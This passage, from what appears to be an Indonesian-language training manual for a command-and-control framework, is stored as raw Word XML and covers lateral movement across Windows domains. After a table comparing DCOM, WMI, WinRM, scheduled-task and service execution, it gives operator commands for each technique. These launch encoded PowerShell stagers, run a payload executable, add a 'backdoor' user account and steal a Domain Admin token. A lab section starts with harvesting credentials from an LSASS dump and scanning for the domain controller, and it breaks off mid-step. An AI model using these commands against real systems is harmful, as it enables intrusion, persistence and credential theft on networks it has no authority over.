              <w:t>powershell.exe</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Fire-and-forget</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>⭐ Minimal</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Admin token</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>WMI</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>wmic.exe</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Fire-and-forget</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Rendah</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Admin + cred</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>WinRM</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>powershell.exe</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Output captured</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Rendah</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Admin + WinRM on</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Schtask</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>schtasks.exe</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Fire-and-forget</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Sedang</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Admin + cred</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Service</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>sc.exe</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Fire-and-forget</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Tinggi</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Admin + cred</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="280" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>DCOM — Paling Stealth</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:i w:val="0"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>DCOM (Distributed COM) mengaktifkan COM object di remote host dan memanggil method yang men-spawn process. Tidak ada service, scheduled task, atau named pipe — artefak paling minimal.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># DCOM via MMC20.Application (default, paling kompatibel)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>lateral dcom &lt;agent-id&gt; DC01 "powershell -enc &lt;B64_STAGER&gt;"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DCOM via ShellWindows (butuh desktop session aktif di target)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>lateral dcom &lt;agent-id&gt; 192.168.1.100 \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  "cmd /c net user backdoor P@ss /add" \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  --method shellwindows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DCOM via ShellBrowserWindow (fallback)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>lateral dcom &lt;agent-id&gt; FS01 \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  "C:\Windows\Temp\payload.exe" \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  --method shellbrowser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Workflow: steal DA token dulu, lalu DCOM</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>token steal &lt;agent-id&gt; --pid &lt;DA_SESSION_PID&gt; --wait</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>lateral dcom &lt;agent-id&gt; DC01 "powershell -enc &lt;B64&gt;" --wait</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="280" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>WMI Execution</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># WMI dengan credential eksplisit</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>lateral wmi &lt;agent-id&gt; 192.168.1.100 \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  "cmd /c whoami &gt; C:\Temp\out.txt" \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  --user Administrator --domain CORP --pass 'Admin@2026'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WMI dengan current token (setelah token steal)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>lateral wmi &lt;agent-id&gt; DC01 "powershell -enc &lt;B64&gt;" --wait</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="280" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>WinRM (Output Captured)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># WinRM — satu-satunya teknik yang capture output</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>lateral winrm &lt;agent-id&gt; DC01 \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  "hostname; whoami; net user" \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  --user john.doe --domain CORP --pass 'CorpMail@2026!'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Jalankan script PowerShell</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>lateral winrm &lt;agent-id&gt; FS01 \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  "(Get-ChildItem C:\Users -Recurse -Filter *.txt).FullName" \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  --user admin --domain CORP --pass 'P@ss' --wait</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="280" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>Scheduled Task Remote</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Buat, jalankan, dan hapus schtask di remote host</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>lateral schtask &lt;agent-id&gt; 192.168.1.50 \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  "powershell -w hidden -enc &lt;B64&gt;" \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  --user Administrator --domain CORP --pass 'P@ss' --wait</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="240" w:after="80"/>
        <w:shd w:val="clear" w:color="auto" w:fill="C0392B"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">  LAB 15.1  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">  Lateral Movement ke Domain Controller via DCOM</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">Step 1:  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Kumpulkan credential dari LSASS dump (lihat Bagian 12).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">Step 2:  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Scan untuk menemukan DC di jaringan.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>netscan &lt;agent-id&gt; --targets 192.168.1.0/24 --ports 88,389,445 --wait</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">Step 3:  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Steal token Domain Admin dari session yang ada.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>token list &lt;agent-id&gt; --wait</w:t>
      </w:r>
